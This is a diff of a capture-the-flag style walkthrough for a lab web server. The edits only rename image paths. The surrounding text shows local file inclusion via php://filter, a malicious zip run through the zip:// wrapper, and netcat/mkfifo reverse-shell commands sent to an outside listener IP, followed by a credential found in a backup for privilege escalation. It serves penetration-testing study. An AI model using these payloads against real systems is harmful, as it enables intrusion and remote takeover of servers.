@@ -6,11 +6,11 @@ description: Community Rating:Very hard
 
 So we start off with a scan:
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This is the webpage:
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 what i'm interested in is the possible LFI withe file=home parameter so i try reading important stuff ->
 
@@ -38,7 +38,7 @@ output on the screen:
 cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgdmFsdWU9IlVwbG9hZCI+CgkJCQkJCTwvZGl2PgoJCQkJCQk8ZGl2IGNsYXNzPSJjdXN0b20tZmlsZSI+CgkJCQkJCSAgICA8aW5wdXQgdHlwZT0iZmlsZSIgY2xhc3M9ImN1c3RvbS1maWxlLWlucHV0IiBuYW1lPSJpbWdbXSIgbXVsdGlwbGU+CgkJCQkJCSAgICA8bGFiZWwgY2xhc3M9ImN1c3RvbS1maWxlLWxhYmVsIiA+Q2hvb3NlIEZpbGU8L2xhYmVsPgoJCQkJCQk8L2Rpdj4KCQkJCQk8L2Rpdj4KCQkJCTwvZm9ybT4KCQkJCQogICAgCQk8L2Rpdj4KCQk8L2Rpdj4KICA8L2Rpdj4KCgo8L2Rpdj4KCjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgPGZvb3Rlcj4KICAgIDxwPiZjb3B5OyBaaXBwZXIgMjAyMTwvcD4KICA8L2Zvb3Rlcj4KPC9kaXY+IDwhLS0gLy5jb250YWluZXIgLS0+CjwhLS0gcGFydGlhbCAtLT4KICA8c2NyaXB0IHNyYz0naHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvcG9wcGVyLmpzLzEuMTMuMC91bWQvcG9wcGVyLm1pbi5qcyc+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy90d2l0dGVyLWJvb3RzdHJhcC80LjAuMC1iZXRhLjIvanMvYm9vdHN0cmFwLmJ1bmRsZS5taW4uanMnPjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4K
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So the funny thing os a did not even specify a php file and it still outputed something so that must mean the backend appends .php to my filename home -> home.php / index -> index.php etc
 
@@ -48,13 +48,13 @@ view-source:http://192.168.56.229/index.php?file=php://filter/convert.base64-enc
 
 lol ok that was it:
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I tried uploadingg something just for fun earlier and saw this:
 
 &#x20;
 
-<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 so i tried reading the content of the upload function:
 
@@ -65,7 +65,7 @@ so i tried reading the content of the upload function:
 
 so uploads file does not exist but upload.php exists:
 
-<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Here are the key points that make this code bad:
 
@@ -81,15 +81,15 @@ So now i need to create a malicious zip file that will give me some sort of foot
 
 {% embed url="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams" %}
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So i create a zip file:
 
-<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 hahahahahhaha letsgooooo:
 
-<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I got stuck here since i forgot that .php was appended so i tried stuff like:
 
@@ -108,7 +108,7 @@ nc%20192.168.49.56%201234%20-e%20sh
 
 and i obtain a reverse shell juste like that:
 
-<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 curl 'http://192.168.56.229/index.php?file=zip://uploads/upload_1739301135.zip%23payload&cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|sh%20-i%202>%261|nc%20192.168.49.56%201234%20>/tmp/f'
@@ -116,15 +116,15 @@ curl 'http://192.168.56.229/index.php?file=zip://uploads/upload_1739301135.zip%2
 
 After enumerating for a bit i quickly find a backup file in /opt
 
-<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 so i start looking at every file mentionned in this file and end up looking at:
 
-<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 this felt a bit wierd so i tried it as a password and got a shell lol
 
-<figure><img src="../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 and after looking why this happens i got my explanation:
 
